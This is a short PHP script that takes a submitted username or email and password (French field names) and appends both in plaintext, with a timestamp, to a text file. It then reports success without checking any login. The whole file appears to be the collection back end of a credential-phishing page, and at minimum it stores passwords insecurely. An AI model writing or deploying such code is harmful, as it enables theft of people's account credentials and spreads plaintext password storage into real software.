<?php
// Define the file path
$file = 'data.txt';

// Check if the form is submitted via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitize and validate input data
    $pseudo_or_mail = htmlspecialchars(trim($_POST['pseudo_or_mail']));
    $mot_de_passe = htmlspecialchars(trim($_POST['mot_de_passe']));

    // Create an entry with the current timestamp
    $entry = "Pseudo or Email: $pseudo_or_mail\nPassword: $mot_de_passe\nSubmitted on: " . date('Y-m-d H:i:s') . "\n\n";

    // Try to append the entry to the file
    if (file_put_contents($file, $entry, FILE_APPEND | LOCK_EX)) {
        // Send a success response
        echo json_encode(["status" => "success", "message" => "Data saved successfully"]);
    } else {
        // Send an error response
        echo json_encode(["status" => "error", "message" => "Error saving data"]);
    }
}
?>